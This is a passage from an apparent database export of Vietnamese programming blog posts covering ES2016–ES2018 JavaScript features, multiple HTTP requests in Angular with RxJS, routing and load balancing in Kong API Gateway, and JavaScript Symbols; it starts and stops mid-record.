doSomethingExtraNice(optionalResult))\n            .catch(e => {})); // No need nesting\n        .then(() => moreCriticalStuff())\n        .catch(e => console.log("Critical failure: " + e.message));\n\n    // Better\n    doSomethingCritical()\n        .then(result => doSomethingOptional())\n        .then(optionalResult => doSomethingExtraNice(optionalResult))\n        .then(() => moreCriticalStuff())\n        .catch(e => console.log("Critical failure: " + e.message));\n    ```\n    + Không `catch` error có thể dẫn đến lỗi "Uncaught promise rejections" (có thể làm crash Nodejs app)\n\n# ES 2016\n## [Exponent (**) operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Arithmetic_Operators#Exponentiation_(**))\nCó thể dùng thay thế cho `Math.pow`:\n```js\nMath.pow(2, 3) == 2 ** 3;\n```\n\n## Array method [`includes`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes)\nCheck phần tử có thuộc array:\n```js\nconst numbers = [1, 2, 3];\nconsole.log(numbers.includes(2)); // true\n\nconst pets = ['cat', 'dog', 'bat'];\nconsole.log(pets.includes('cat')); // true\nconsole.log(pets.includes('at')); // false\n```\n\n# ES 2017\n## [Object.values](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/values), [Object.entries](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/entries)\n`Object.values` trả về mảng giá trị của từng key trong object:\n```js\nconst object1 = {\n    a: 'somestring',\n    b: 42,\n    c: false\n};\n\nconsole.log(Object.values(object1));\n// expected output: Array ["somestring", 42, false]\n```\n\n`Object.entries` trả về mảng cặp giá trị [key, value] của object:\n```js\nconst object1 = {\n    a: 'somestring',\n    b: 42\n};\n\nfor (let [key, value] of Object.entries(object1)) {\n  console.log(`${key}: ${value}`);\n}\n// expected output:\n// "a: somestring"\n// "b: 42"\n```\n\n## [Async / Await](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function)\n- Sử dụng Promise như cách lập trình đồng bộ thông thường (synchronous)\n- await chỉ có thể được dùng trong async function để tạm dừng async function *chờ* kết quả từ một Promise\n    ```js\n    function resolveAfter2Seconds() {\n        return new Promise(resolve => {\n            setTimeout(() => {\n                resolve('resolved');\n            }, 2000);\n        });\n    }\n\n    function promiseCall() {\n        console.log('calling');\n        return resolveAfter2Seconds()\n            .then(result => console.log(result));\n            // expected output: 'resolved'\n    }\n    promiseCall();\n\n    async function asyncCall() {\n        console.log('calling');\n        const result = await resolveAfter2Seconds();\n        console.log(result);\n        // expected output: 'resolved'\n    }\n    asyncCall();\n    ```\n- Giá trị trả về function async function luôn là một Promise, vì được ngầm định wrapped trong `Promise.resolve()`\n- Await trong loop\n    ```js\n    function wait(second) {\n        return new Promise(resolve => {\n            setTimeout(() => resolve('Resolved ' + second), 1000 * second);\n        });\n    }\n\n    function returnPromises(seconds) {\n        // async function always returns promise\n        // so this will return array of promises\n        return seconds.map(async second => await wait(second));\n    }\n\n    function returnOnePromise(seconds) {\n        const promises = seconds.map(async second => await wait(second));\n\n        // Use Promise.all to return only one promise\n        return Promise.all(promises);\n    }\n\n    async function test() {\n        const seconds = [1, 2, 3];\n        const promises = await returnPromises(seconds);\n        console.log(promises); // Run immediately because we just return array of promises as result of `map()` function\n\n        const values = await returnOnePromise(seconds);\n        console.log(values); // After 3 seconds\n    }\n\n    async function testConcurrent() {\n        const start = performance.now();\n        const values1 = returnOnePromise([1, 2]);\n        const values2 = returnOnePromise([1, 2, 3]);\n\n        console.log(await values1); // 2 seconds from start\n        console.log(performance.now() - start);\n        console.log(await values2); // + 1 seconds = 3 seconds from start\n        console.log(performance.now() - start);\n    }\n    ```\n\n# ES 2018\n## [Object rest/spread operators](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax#Spread_in_object_literals)\n- Support rest/spread operator cho object:\n- Rest properties:\n    ```js\n    let { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 };\n    x; // 1\n    y; // 2\n    z; // { a: 3, b: 4 }\n    ```\n- Spread properties:\n    ```js\n    let n = { x, y, ...z };\n    n; // { x: 1, y: 2, a: 3, b: 4 }\n    ```\n    Clone, merge object:\n    ```js\n    const obj1 = { foo: 'bar', x: 42 };\n    const obj2 = { foo: 'baz', y: 13 };\n\n    const clonedObj1 = { ...obj1 };\n    clonedObj1.foo = 'changed';\n    // clonedObj1 { foo: "changed", x: 42 }\n    // obj1 { foo: "bar", x: 42 }\n\n    const mergedObj = { ...obj1, ...obj2 };\n    // Object { foo: "baz", x: 42, y: 13 }\n    ```\n\n## [Promise `finally`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/finally)\n- Define callback được thực thi trong cả 2 trường hợp Promise chạy thành công hoặc có lỗi\n- Tránh lặp code trong `then()` và `catch()`, chẳng hạn set trạng thái loading khi gọi ajax:\n    ```js\n    let isLoading = true;\n\n    fetch(url)\n        .then(response => response.json())\n        .then(data => console.log(data))\n        .catch(error => console.log(error))\n        .finally(() => isLoading = false);\n    ```\n\n# Reference\n- http://es6-features.org/\n- https://github.com/lukehoban/es6features/\n- https://kangax.github.io/compat-table/es6/\n- https://medium.com/craft-academy/everything-i-learned-from-es6-for-everyone-ff93ebc64b86\n- https://developer.mozilla.org/en-US/docs/Web/JavaScript	Một số ghi chép của mình trong quá trình học ES hơi sâu :sweat_smile:\n\nECMAScript\n- Tên chính thức của Javascript\n- Tài liệu chuẩn hóa Javascript\n- Thường được gọi tắt là ES\n\nES6\n\nES6 là gì?\n- Bản đặc tả ECMAScript phiên bản 6. Đặc tả tức là bản mô tả chức năng, cú pháp, còn việc có hỗ trợ hay không là phụ thuộc vào phiên bản của từng platform (browser, node.js, babel transpiler,...)\n- Ra đời v...	{}	1	Tham chiếu và ghi chú ngắn về ES6, ESNext	{ecmascript,javascript}	0	f	2022-12-18 15:33:37.986+00	2022-12-18 15:33:37.986+00
31850	Một trường hợp điển hình mà chúng ta gặp phải khi làm việc với các ứng dụng **Single page** đó là việc lấy dữ liệu từ nhiều **API endpoints** khác nhau và sau đó hiển thị dữ liệu được trả về cho người dùng. Việc xử lý nhiều **HTTP requests** và quản lý chúng có thể gặp chút khó khăn nhưng với **Angular HTTP service** và một chút trợ giúp từ thư viện **RxJS** đi kèm, thì chúng ta có thể thực hiện được chỉ trong một vài dòng code. Có nhiều cách để xử lý nhiều **HTTP requests**, chúng có thể là tuần tự hoặc song song. Trong bài này, mình sẽ đề cập đến cả hai.\n\nTrước khi đi vào nội dung chính, mình xin chia sẻ cho các bạn một số thông tin về môi trường chạy, cũng như phiên bản của Angular, RxJS và API mà mình sử dụng trong bài viết này:\n* **Angular**: 8.0.0\n* **RxJS**: 6.5.2\n* **API**: https://swapi.co/\n\nTrong bài viết này, mình sẽ sử dụng một API có sẵn (https://swapi.co/), API này cho phép chúng ta lấy ra được những thông tin liên quan đến bộ phim nổi tiếng **Star Wars: Chiến tranh giữa các vì sao** :D. Ví dụ như thông tin về các nhân vật, hành tinh, phi thuyền, ... có trong phim.\n\nHãy bắt đầu với một ví dụ đơn giản là xử lý một **HTTP request** với **Angular HTTP service**:\n\n```javascript:app/app.component.ts\nimport { Component } from '@angular/core';\nimport { HttpClient } from '@angular/common/http';\n\n@Component({\n  selector: 'app-root',\n  templateUrl: 'app/app.component.html'\n})\nexport class AppComponent {\n\n  constructor(private http: HttpClient) { }\n  \n  ngOnInit() {\n    this.http.get('https://swapi.co/api/people/1').subscribe(res => {\n      console.log(res);\n    });\n  }\n}\n```\n\nTrong app của chúng ta, hiện tại chỉ có một **component** duy nhất sử dụng **Angular HTTP service** thông qua **Dependency Injection**. **Angular** sẽ cung cấp cho chúng ta một đối tượng của **HTTP service** khi chúng ta khai báo trong **constructor** của **component**.\n\nBây giờ chúng ta đã có **service**, tiếp đến ta sẽ gọi tới **service** này trong `ngOnInit` để lấy dữ liệu trả về từ API. Chúng ta call tới api `https://swapi.co/api/people/1` với `http.get()` bằng phương thức **GET**. Sau đó chúng ta gọi tới **subscribe** để lấy dữ liệu trả về từ API. Và khi dữ liệu được trả về, chúng ta chỉ cần **log** nó lại bằng đối tượng **console**. Đây là một ví dụ đơn giản về cách xử lý một **HTTP request**, giờ chúng ta sẽ chuyển sang trường hợp xử lý 2 **HTTP requests**.\n\n## Subscribe\nTrong ví dụ tiếp theo, ta sẽ cần lấy thông tin homeworld của một character. Tuy nhiên, để lấy được chúng ta sẽ cần phải lấy được thông tin của character trước, sau đó phải chờ dữ liệu trả về từ API thì lúc này chúng ta mới có dữ liệu cần thiết để tiếp tục lấy được thông tin homeworld. Trong trường hợp này, chúng ta bắt buộc phải gọi tới 2 API endpoints khác nhau và 2 API endpoints này phải được sắp xếp một cách tuần tự.\n\n```javascript:app/app.component.ts\nimport { Component } from '@angular/core';\nimport { HttpClient } from '@angular/common/http';\n\n@Component({\n  selector: 'app-root',\n  templateUrl: 'app/app.component.html'\n})\nexport class AppComponent {\n  constructor(private http: HttpClient) { }\n  \n  ngOnInit() {\n    this.http.get('https://swapi.co/api/people/1').subscribe(character => {\n      this.http.get(character.homeworld).subscribe(homeworld => {\n        console.log(homeworld);\n      });\n    });\n  }\n}\n```\n\nTrong **life cycle** `ngOnInit`, chúng ta có thể thấy có tới 2 HTTP requests. Tại request đầu tiên, chúng ta gọi tới API `https://swapi.co/api/people/1` để lấy ra dữ liệu của character.\n\n![](https://images.viblo.asia/5dc5d26c-6635-434a-891f-2b53821f5b74.png)\n\nSau khi lấy được dữ liệu character được trả về từ API, chúng ta có thế lấy được dữ liệu homeworld của character này thông qua homeworld API endpoint. Vậy là chúng ta đã đạt được mục tiêu ban đầu đề ra là lấy được thông tin của character. Tuy nhiên, có 2 điều cần chú ý trong cách này. Thứ nhất, chúng ta đang trình bày theo cấu trúc nested (lồng nhau), nếu như có thêm nhiều request cần xử lý thì code của chúng sẽ khó đọc hơn rất nhiều. Thứ hai, 2 requests trên đều là 2 requests tuần tự, vì vậy chúng ta buộc phải đặt lồng nhau nếu sử dụng phương thức subscribe. Tuy nhiên, RxJS có cung cấp cho chúng ta một số operator giúp cho việc xử lý nhiều request trở nên dễ dàng và ngắn ngọn hơn rất nhiều. Chúng ta hãy cùng xem những ví dụ tiếp theo để biết đó là những operator.\n\n## MergeMap\nTrong ví dụ này, chúng ta sử dụng `mergeMap` / `flatMap` (`flatMap` là một alias của `mergeMap`) để lặp qua các giá trị được trả về từ **Observable**. Vì vậy khi nhận được **homeworld**, nghĩa là chúng ta đang nhận lại một **Observable** bên trong luồng **Observable** của **character**. Điều này tạo ra một **Observable** lồng nhau trong một **Observable** khác. `mergeMap` giúp chúng ta lấy được giá trị từ **Observable** bên trong và chuyển nó trở lại luồng cha. Việc này có thể mất một chút thời gian để làm quen, nhưng trên thực tế nó vẫn là một công cụ tiện dụng của thư viện **RxJS**.\n\n```javascript:app/app.component.ts\nimport { Component } from '@angular/core';\nimport { HttpClient } from '@angular/common/http';\nimport { mergeMap } from 'rxjs/operators';\n\n@Component({\n  selector: 'app-root',\n  templateUrl: 'app/app.component.html'\n})\nexport class AppComponent {\n  constructor(private http: HttpClient) { }\n  \n  ngOnInit() {\n    this.http.get('https://swapi.co/api/people/1').pipe(\n      mergeMap(character => this.http.get(character['homeworld']))\n    ).subscribe(homeworld => {\n      console.log(homeworld);\n    });\n  }\n}\n```\n\nVừa rồi chúng ta đã làm quen với `mergeMap` để xử lý các request tuần tự, vậy còn các request song song thì xử lý thế nào, để biết chúng ta hãy cùng đi đến ví dụ tiếp theo.\n\n## ForkJoin\nTrong ví dụ tiếp theo này, chúng ta sẽ dùng một operator được gọi là `forkJoin`. Nếu bạn cảm thấy giống **promise**, thì nó thực sự rất giống với `Promise.all()`. `forkJoin`  cho phép chúng ta nhóm nhiều **Observable** lại với nhau, và thực thi chúng một cách song song. Sau khi tất cả **Observable** được thực thi xong, **forkJoin** sẽ chuyển chúng thành một **Observable** duy nhất. Giá trị trả về khi **subscribe** sẽ là một mảng các kết quả tương ứng với các **Observable** trong `forkJoin`. Trong ví dụ này, chúng ta muốn lấy ra một character và một homeworld của character đó. Chúng ta đã biết ID của character này, vì vậy ta có thể thực hiện 2 request này một cách song song.\n\n```javascript:app/app.component.ts\nimport { Component } from '@angular/core';\nimport { HttpClient } from '@angular/common/http';\nimport { Observable, forkJoin } from 'rxjs';\n\n@Component({\n  selector: 'app-root',\n  templateUrl: 'app/app.component.html'\n})\nexport class AppComponent {\n  constructor(private http: HttpClient) { }\n  \n  ngOnInit() {\n    const character = this.http.get('https://swapi.co/api/people/1');\n    const characterHomeworld = this.http.get('http://swapi.co/api/planets/1');\n\n    forkJoin([character, characterHomeworld]).subscribe(results => {\n      console.log('character', results[0]);\n      console.log('characterHomeworld', results[1]);\n    });\n  }\n}\n```\n\nTrong đoạn code trên, chúng ta lưu vào `character` và `characterHomeworld` vào các biến. Chúng sẽ không thực thi cho đến khi chúng ta **subscribe**. Khi chúng ta truyền chúng vào `forkJoin`, thì `forkJoin` sẽ **subscribe** và thực thi các **Observable**, thu thập từng giá trị lấy được và gộp chúng lại thành một mảng các giá trị được trả về từ các request.\n\n## Kết luận\nTrên đây, mình đã giới thiệu cho các bạn về các cách để xử lý nhiều HTTP requests trong Angular với RxJS. Với `mergeMap` / `flatMap` và `forkJoin`, ta có thể xử lý nhiều request một cách dễ dàng hơn cũng như code cũng sẽ ngắn ngọn và dễ đọc hơn. Cám ơn các bạn đã đọc bài viết của mình.\n\n-----\n***Live demo:** https://stackblitz.com/edit/multi-http-requests*\n\n***Tài liệu tham khảo:** https://coryrylan.com/blog/angular-multiple-http-requests-with-rxjs*	Một trường hợp điển hình mà chúng ta gặp phải khi làm việc với các ứng dụng Single page đó là việc lấy dữ liệu từ nhiều API endpoints khác nhau và sau đó hiển thị dữ liệu được trả về cho người dùng. Việc xử lý nhiều HTTP requests và quản lý chúng có thể gặp chút khó khăn nhưng với Angular HTTP service và một chút trợ giúp từ thư viện RxJS đi kèm, thì chúng ta có thể thực hiện được chỉ trong một...	{https://images.viblo.asia/5dc5d26c-6635-434a-891f-2b53821f5b74.png}	1	Xử lý nhiều HTTP requests trong Angular với RxJS	{angular,rxjs,javascript}	0	f	2022-12-18 15:33:37.859+00	2022-12-18 15:33:37.859+00
32008	Với các bạn chưa biết API Gateway là gì? Có ăn được không? Tại sao phải dùng nó? có thể tham khảo bài viết đầu của mình tại [đây](https://viblo.asia/p/api-gateway-la-gi-tai-sao-mot-he-thong-microservices-lai-can-api-gateway-Do754pDX5M6).\n\nSau khi tìm hiểu xong API Gateway là gì rồi, các bạn có thể xem phần giới thiệu và cách cài đặt ăn liền của Kong API Gateway tại [đây](https://viblo.asia/p/gioi-thieu-va-cai-dat-kong-lam-api-gateway-cho-he-thong-microservices-YWOZr88P5Q0).\n\nỞ phần tiếp theo này, mình sẽ hướng dẫn các bạn sử dụng Kong một cách cơ bản và có thể áp dụng được ngay vào trong dự án của cá nhân hoặc sử dụng một cách sương sương trong thực tế :Đ\n\n\n# Chuẩn bị\n\nChúng ta có thể sử dụng luôn các dự án microservices cá nhân hoặc clone một vài cái sourcecode trên github về để thử nghiệm luôn. Ở đây để cho tiện thì mình sẽ sử dụng Mockapi để tạo ra 3 cái restful resource tương ứng với 3 cái services trong hệ thống, giả sử như chúng ở 3 cái servers khác nhau nhé, thằng mockapi.io chỉ cho tạo 1 project với 1 tên miền, thêm phải trả phí, mà giờ thì gần cuối tháng rồi cho nên...\n\n![Imgur](https://i.imgur.com/CSujpw6.png)\nOke, vậy là chúng ta tạm thời có 3 services để quản lý user, product và order. Với domain là `5d2c8d178c900700149726bf.mockapi.io`\n\nSau khi chuẩn bị xong các services để thử nghiệm, chúng ta đăng nhập vào `Konga` để bắt đầu thiết lập và sử dụng Kong.\n\n\n# Thiết lập Kong API Gateway để cân bằng tải và điều hướng Requests\nMình sẽ hướng dẫn cách thiết lập Kong từ bước đã chạy xong thành công Konga sau khi cài đặt và kết nối tới Kong Admin API như trong hướng dẫn ở bài trước (link mình để ở đầu bài, nhỡ có lười ngước lên thì click vào [đây](https://viblo.asia/p/gioi-thieu-va-cai-dat-kong-lam-api-gateway-cho-he-thong-microservices-YWOZr88P5Q0). \n\n\n## Upstream\n\n### Upstream là gì? Tạo mới một upstream\n\nUpstream là một virtual hostname chứa một nùi các config giúp chúng ta khai báo, quản lý, cân bằng tải và monitoring các servers chứa services. Chúng ta sẽ tạo một cái Upstream mới bằng cách chuyển sang mục `UPSTREAM` trên Konga và bấm nút `CREATE UPSTREAM`.  Trên thực tế sử dụng, chúng ta nên tạo 1 Upstream tương ứng với 1 cụm servers chứa cùng 1 (hoặc 1 cụm service).\nVí dụ như là mình deploy service quản lý `user` trên 3 cái servers khác nhau, rồi service `product` để trên 2 cái servers. Thì tương ứng chúng ta sẽ tạo 2 cái upstreams đó là `user-upstream` và `product-upstream` để tiện cho việc cân bẳng tải. Nhưng mà mình chỉ có mỗi cái server tạo bằng mockapi nên là mình sẽ chỉ tạo 1 cái upstream để làm example.\n\nKhi tạo một upstream, chúng ta sẽ thấy có rất nhiều thứ chúng ta có thể config trên popup như `Active health checks`, `Passive health checks`, rồi tùy chỉnh http code được xem là healthy, ròi không healthy, các bạn có thể tìm hiểu sâu hơn bằng cách đọc description của chúng trên Konga. Nhưng tạm thời để đơn giản, chúng ta cứ để mọi thứ như mặc định.\n![Imgur](https://i.imgur.com/gi9a9dd.png)\n![Imgur](https://i.imgur.com/65raAuI.png)\n\n### Set targets\n\nSau khi tạo xong một upstream, chúng ta bắt đầu set  `Targets` cho nó. `Targets` chính là đích mà các cái Upstream của ta hướng tới, bản chất nó chính là địa chỉ của các server chứa services. Với mỗi 1 server, chúng ta sẽ tạo 1 cái target tương ứng bằng cách bấm vào mục `Details` của Upstream ,  chọn mục `Targets` và chọn `ADD TARGET`\n\n`Target` chính là cái địa chỉ IP:port hoặc domain:port của server mà chúng ta muốn thêm vào. Trọng số (Weight) ở đây là chính là để cân bằng tải, Kong sử dụng thuật toán lập lịch Round Robin có trọng số để cân bằng tải giữa các servers ở trong một upstream, trọng số tối đa là 1000 như mặc định ở bước tạo Upstream. \nNhư trong ví dụ, target của mình sẽ là `5d2c8d178c900700149726bf.mockapi.io:80`, trọng số vì có 1 server nên không quan trọng nên mình cứ để mặc định, nếu bạn add thêm targets vào thì cần cân nhắc nên cho server nào có trọng số cao hay đồng đều nhau...\n\n![Imgur](https://i.imgur.com/imAQSs2.png)\n\n## Service\n\n### Service trong Kong là gì? Tạo mới các services\n> Service entities, as the name implies, are abstractions of each of your own upstream services. Examples of Services would be a data transformation microservice, a billing API, etc.\n\nCác bạn có thể hiểu đơn giản Service chính là để biểu thị cho một cái service hoặc version của service của chúng ta để có thể tiện cho việc config và sử dụng. \n\nNhững phiên bản cũ của Kong thì sử dụng `API` để configs việc routing nhưng ở phiên bản mới hơn, Kong không khuyến khích sử dụng (và tương lai sẽ bỏ) cách này mà thay vào đó là sử dụng Service và Route. \n\nĐể tạo mới services, chúng ta vào mục `Services` trên Konga và bấm vào `ADD NEW SERVICE`.\n![Imgur](https://i.imgur.com/McIigEg.png)\n\nChú ý các options:\n- `name`: tên của service, ở đây mình tạo service để quản lý service user nên mình đặt tên là `user-service`\n- `protocol`: http protocol đc sử dụng, mình đang dùng http\n- `host`: tên của upstream, ở trên mình tạo nó là `user-server`\n- `port`: port của server sử dụng, default 80\n- `path`: đường dẫn tới service trên upstream\n- `retries`: số lần thử khi Kong không gọi tới được server upstream.\n- ...\n\n### Set routes\n`Route` chính là tập hợp các quy tắc để Kong match request tới đúng cái API trên services mà nó cần tới.\n\nSau khi tạo service, chúng ta sẽ thêm các `Routes` để điều hướng các request tới chính xác các API trong service này, nếu bạn cần quản lý một cách chi tiết từng API một thì mỗi API sẽ để một routes, hoặc không cần thì bạn config làm sao cho cái routes đó nó match hết các đường dẫn của các API trong service là được, trong trường hợp này mình sẽ hướng dẫn cách Add để route nó match từng API một. \n\nTương tự như khi thêm `targets` vào `upstream`, ta vào xem detail của `Services` và chọn `Routes`  rồi bấm nút `ADD ROUTES`\n![Imgur](https://i.imgur.com/JCJFvfp.png)\n\n---------------\n\n![Imgur](https://i.imgur.com/uJbxWEd.png)\nChú ý các options:\n- `name`: Tên của routes, để tiện quản lý thì mình để users-get-user để \n- `protocols`: http protocol sử dụng\n- `paths`: list các path match route này,  ở ví dụ này mình sẽ add cái API get user info (`/api/v1/users/<id>`). Có thể sử dụng regex trong paths\n- `methods`: danh sách các http methods match cái route này, đang là get nên mình để GET thôi.\n- `strip_path`: Xóa phần prefix của paths khi tới upstream server, hiện tại mình đang muốn uri của kong và server api là giống nhau nên mình chọn `No`.\n\nLưu ý quan trọng: **For hosts, paths, methods and protocols, press enter to apply every value you type**\ntức là bạn thêm GET vào method bạn phải gõ GET rồi enter một cái thằng Konga mới nhận =)) \nVới các API khác trong service này, các bạn add các routes tương tự. Tương ứng với việc tạo các services về Products và Orders.\n\nTrong trường hợp nếu bạn muốn tạo 1 route mà match tất cả các API thì chỉ cần để path rỗng rồi http method là GET POST PUT PATCH DELETE thì nó sẽ match toàn bộ các api có đường dẫn như trong services (`/api/v1/users`)\n\n## Thử nghiệm\nVậy là chúng ta đã thiết lập xong Kong để nó có thể điều hướng được tới các API trên từng services cụ thể rồi thì chúng ta thử gửi request tới API get user xem kết quả sẽ ra sao.\n\nThay vì gọi trực tiếp tới server api là `http://5d2c8d178c900700149726bf.mockapi.io` thì ta sẽ gọi thông qua Kong Proxy server, mặc định nó sẽ chạy công 8000 với http requests `http://localhost:8000`\n\nGọi trực tiếp \n\n![Imgur](https://i.imgur.com/7gUR2Gv.png)\n\nGọi thông qua Kong, response body trả về giống với gọi trực tiếp nhưng response header đã thông báo server là Kong chứ không phải mockapi.io\n\n![Imgur](https://i.imgur.com/1kfZnOg.png)\n\n# Kết luận\n\nTrong bài trên mình đã hướng dẫn các bạn cách sử dụng Kong API Gateway để định tuyến và cân bằng tải - chức năng chính của 1 API gateway. Hi vọng các bạn có thể dần dần sử dụng được API Gateway trong các dự án thực tế của mình.\nỞ phần tiếp theo mình sẽ đi vào các phần nâng cao hơn một chút như bảo mật, giới hạn người dùng, logging và monitoring trên Kong.	Với các bạn chưa biết API Gateway là gì? Có ăn được không? Tại sao phải dùng nó? có thể tham khảo bài viết đầu của mình tại đây.\n\nSau khi tìm hiểu xong API Gateway là gì rồi, các bạn có thể xem phần giới thiệu và cách cài đặt ăn liền của Kong API Gateway tại đây.\n\nỞ phần tiếp theo này, mình sẽ hướng dẫn các bạn sử dụng Kong một cách cơ bản và có thể áp dụng được ngay vào trong dự án của cá nhân...	{https://i.imgur.com/CSujpw6.png,https://i.imgur.com/gi9a9dd.png,https://i.imgur.com/65raAuI.png,https://i.imgur.com/imAQSs2.png,https://i.imgur.com/McIigEg.png,https://i.imgur.com/JCJFvfp.png,https://i.imgur.com/uJbxWEd.png,https://i.imgur.com/7gUR2Gv.png,https://i.imgur.com/1kfZnOg.png}	1	Hướng dẫn sử dụng (hơi) chi tiết Kong API Gateway để cân bằng tải và điều hướng requests trong hệ thống Microservices	{microservices,api,api-gateway}	0	f	2022-12-18 15:33:37.893+00	2022-12-18 15:33:37.893+00
31927	# Symbol\n\nKể từ ES6, một primitive type mới đã được thêm vào JavaScript, đó là symbol. Không giống như các primitive type khác, symbol không có literal form.\n\nĐây là cách mà ta tạo ra một symbol:\n```\nvar sym = Symbol("some optional description");\n\ntypeof sym; // "symbol"\n```\n\nCần lưu ý rằng:\n\n- Ta không thể và không nên sử dụng `new` với `Symbol(..)`. Nó không phải là một constructor và về cơ bản thì chúng ta không phải đang tạo object.\n- Biến truyền vào `Symbol(..)` là optional. Nếu truyền vào, nó nên là một string mô tả mục đích của symbol.\n- `typeof` sẽ cho output là "symbol", đây thường là cách để ta xác định một giá trị là symbol.\n\nNếu ta truyền description vào thì nó sẽ được sử dụng làm string đại diện cho symbol:\n```\nsym.toString(); // "Symbol(some optional description)"\n```\n\nTương tự như kiểu giá trị primitive string không phải là một instance của String, thì symbol cũng vậy. Nếu vì một lý do nào đó ta cần cấu trúc một boxed wrapper object cho một giá trị symbol, ta có thể làm như sau:\n```\nsym instanceof Symbol; // false\n\nvar symObj = Object(sym);\nsymObj instanceof Symbol; // true\n\nsymObj.valueOf() === sym; // true\n```\n\n> `symObj` trong đoạn code trên có thể hoán đổi với `sym`, cả hai dạng đều sử dụng như một symbol bình thường. Thường thì chả có lý do nào để sử dụng object form thay vì primitive form. Sẽ tốt hơn nếu ta giữ ở dạng đơn giản, phức tạp hóa lên làm gì cho mệt. \n\nGiá trị bên trong của một symbol được tham chiếu đến như tên của nó, nó được ẩn khỏi code và ta cũng không thể lấy giá trị này ra. Bạn có thể hình dung cái giá trị của symbol là một string được auto generated và unique (đối với app của bạn).\n\nNhưng nếu giá trị bị giấu đi và không thể lấy được thì mọc ra cái symbol này để làm gì?\n\nMục tiêu chính của symbol là tạo ra một giá trị dạng string mà không thể trùng với bất kì giá trị nào. Ví dụ, xem xét việc sử dụng một symbol như một constant thể hiện một event name như sau:\n```\nconst EVT_LOGIN = Symbol("event.login");\n```\nSau đó ta sử dụng `EVT_LOGIN` thay cho một generic string literal dạng "event.login":\n```\nevthub.listen(EVT_LOGIN, function() {\n    // ..\n});\n```\nLợi ích có được ở đây là `EVT_LOGIN` giữ một giá trị mà không thể bị trùng bởi bất kì một giá trị nào khác, do đó ta sẽ không gặp phải bất cứ sự nhầm lẫn nào với các event đang được dispatch hay handle.\n\n> Trong đoạn code trên, `evthub` được giả sử rằng nó sử dụng EVT_LOGIN để track event. Nếu `evthub` cần thiết phải sử dụng một giá trị String thực thì symbol không xài được đâu nhé. \n\nBạn có thể sử dụng symbol trực tiếp như property name/key trong một object, giả dự kiểu một giá trị đặc biệt mà bạn muốn giấu đi khi sử dụng. \nTuy nhiên điều quan trọng ta cần hiểu đó là nó không thực sự là một property bị ẩn, mà về cơ bản là ta có ý muốn thiết lập như vậy.\n\nXem xét module dưới implement một singleton pattern:\n```\nconst INSTANCE = Symbol("instance");\n\nfunction HappyFace() {\n    if (HappyFace[INSTANCE]) return HappyFace[INSTANCE]'\n    \n    function smile() { .. }\n    \n    return HappyFace[INSTANCE] = {\n        smile: smile\n    };\n}\n\nvar me = HappyFace(), you = HappyFace();\n\nme === you;\n```\nGiá trị symbol INSTANCE ở đây là một property đặc biệt, gần như bị ẩn và được đặt một cách static trong HappyFace() function object.\n\nNó có thể thay thế là kiểu cũ như dạng `__instance` và behaviour vẫn sẽ giống hệt nhau. Tuy nhiên việc sử dụng symbol giúp cải thiện metaprogramming style, giữ cho `INSTANCE` property tách biệt với các property khác.\n\n## Symbol Registry\nMột nhược điểm nhỏ khi sử dụng symbol như trong một vài ví dụ trước là các biến `EVT_LOGIN` và `INSTANCE` phải được lưu ở outer scope (thậm chí có thể là global scope), hoặc bằng cách nào đó được lưu trữ ở một vị trí public và available, sao cho tất cả các phần code có sử dụng symbol có thể truy cập chúng.\n\nĐể tổ chức code với quyền truy cập vào các symbol này, bạn có thể tạo các giá trị symbol bằng *global symbol registry*. Ví dụ:\n```\nconst EVT_LOGIN = Symbol.for("event.login");\nconsole.log(EVT_LOGIN); // Symbol(event.login)\n```\nvà\n```\nfunction HappyFace() {\n    const INSTANCE = Symbol.for("instance");\n    \n    if (HappyFace[INSTANCE]) return HappyFace[INSTANCE];\n    \n    // ..\n    \n    return HappyFace[INSTANCE] = { .. };\n}\n```\n`Symbol.for(..)` sẽ tìm kiếm global symbol registry để xem xem nếu một symbol đã được tạo ra với description tương ứng chưa, nếu chưa thì nó sẽ tạo ra một cái và trả về.\n\nVà thế cũng có nghĩa là bất kỳ phần nào trong app của bạn cũng có thể nhận symbol sử registry `Symbol.for(..)` với chuỗi description đúng là được.\n\nTrớ trêu là, symbol sinh ra nhằm để thay thế *magic string* trong app. Nhưng chính xác thì ta sử dụng `magic` description string để xác định symbol trong global symbol registry.\n\nĐể tránh việc trùng vô tình, bạn có thể muốn làm cho các symbol description của mình có tính duy nhất. Một cách khá dễ để làm điều này là thêm vào thông tin prefix/context/namespace vào.\n\nVí dụ\n```\nfunction extractValues(str) {\n    var key = Symbol.for("extractValues.parse"),\n        re = extractValues[key] || /[^=&]+?=([^&]+?)(?=&|$)/g,\n        values = [],\n        match;\n    \n    while (match = re.exec(str)) {\n        values.push(match[1]);\n    }\n    \n    return values;\n}\n```\nTa sử dụng "extractValues.parse" vì nó trông có vẻ như là sẽ chẳng có cái nào khác sẽ trùng.\n\nNếu ai đó muốn override lại parsing regex, họ có thể sử dụng symbol registry:\n```\nextractValues[Symbol.for("extractValues.parse")] = /..some pattern../g;\nextractValues("..some string..");\n```\n\nNgoài việc có được hỗ trợ từ symbol registry thì ta có thể thấy là chẳng có cái vẹo gì khác ở đây khi ta dùng trực tiếp "extractValues.parse" thay cho symbol. Cái này chủ yếu có lợi cho metaprogramming.\n\nMột vài trường hợp ta có thể sử dụng symbol được lưu trong registry để xem xem description text được lưu kèm là gì. Ví dụ, ta cần báo hiệu cho một phần khác trong app của mình cách để xác định một symbol trong registry vì ta không thể truyền giá trị symbol.\n\nTa có thể nhận registered symbol's description text sử dụng `Symbol.keyFor(..)`:\n```\nvar s = Symbol.for("something cool");\n\nvar desc = Symbol.keyFor(s);\nconsole.log(desc); // "something cool"\n\n// get the symbol from the registry again\nvar s2 = Symbol.for(desc);\n\ns2 === s; // true\n```\n\n## Symbol as Object Properties\nNếu một symbol được sử dụng như một property/key của một object, nó được chứa theo một vài cách đặc biệt làm cho property không show ra khi ta sử dụng dạng enumeration thông thường của object's properties.\n```\nvar o = {\n    foo: 42,\n    [Symbol("bar")]: "hello world",\n    baz: 